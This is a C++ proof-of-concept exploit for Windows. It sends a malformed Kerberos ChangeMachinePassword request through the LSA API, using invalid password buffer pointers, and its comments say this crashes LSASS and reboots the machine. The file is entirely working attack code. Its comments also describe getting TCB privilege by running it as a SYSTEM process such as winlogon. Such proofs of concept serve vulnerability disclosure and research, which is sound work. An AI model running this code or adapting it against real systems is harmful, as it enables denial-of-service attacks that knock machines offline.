#include <Windows.h>

#define SECURITY_WIN32
#include <codecvt>
#include <iomanip>
#include <iostream>
#include <locale>
#include <ntsecapi.h>
#include <security.h>
#include <string>
#include <vector>
#include <winerror.h>

#pragma comment(lib, "Secur32.lib")

enum class PROTOCOL_MESSAGE_TYPE : ULONG {
	DebugRequest = 0,
	QueryTicketCache,
	ChangeMachinePassword
};

typedef struct _KERB_CHANGE_MACH_PWD_REQUEST {
	KERB_PROTOCOL_MESSAGE_TYPE MessageType;
	UNICODE_STRING NewPassword;
	UNICODE_STRING OldPassword;
} KERB_CHANGE_MACH_PWD_REQUEST, * PKERB_CHANGE_MACH_PWD_REQUEST;

int wmain(int argc, wchar_t** argv) {
	// Prepare to send a request to the Kerberos package
	HANDLE lsaHandle;
	if (SUCCEEDED(LsaConnectUntrusted(&lsaHandle))) {
		std::vector<char> buffer{ MICROSOFT_KERBEROS_NAME_A, MICROSOFT_KERBEROS_NAME_A + sizeof(MICROSOFT_KERBEROS_NAME_A) };
		LSA_STRING apName = { buffer.size() - 1, buffer.size(), buffer.data() };
		ULONG apId;
		if (SUCCEEDED(LsaLookupAuthenticationPackage(lsaHandle, &apName, &apId))) {
			KERB_CHANGE_MACH_PWD_REQUEST request;
			request.MessageType = (KERB_PROTOCOL_MESSAGE_TYPE)PROTOCOL_MESSAGE_TYPE::ChangeMachinePassword;
			request.NewPassword.Buffer = (PWSTR)1;
			request.NewPassword.Length = 1;
			request.NewPassword.MaximumLength = 1;
			request.OldPassword.Buffer = (PWSTR)1;
			request.OldPassword.Length = 1;
			request.OldPassword.MaximumLength = 1;

			// Caution. This will send the request which will crash LSASS and your machine will be restarted.
			PVOID response;
			DWORD requestSize{ sizeof(request) };
			ULONG responseSize;
			NTSTATUS status;
			if (SUCCEEDED(LsaCallAuthenticationPackage(lsaHandle, apId, &request, requestSize, &response, &responseSize, &status)) && SUCCEEDED(status)) {
				// If the request was recieve the output will never be received because LSASS has crashed
				// 
				// If the LSASS has not crashed than your request was not accepted by LSASS. That is
				// likely due to not running the POC as a process with the TCB privilege. Please rerun
				// the POC as a process with TCB privilege to verify. The easiest way to test this is to
				// right click a System process (ex. winlogon) in a program such as "process hacker" or
				// "system informer", choose "Miscellanious -> Run as this user..." then run the POC.
				LsaFreeReturnBuffer(response);
			}
		}
		LsaDeregisterLogonProcess(lsaHandle);
	}
}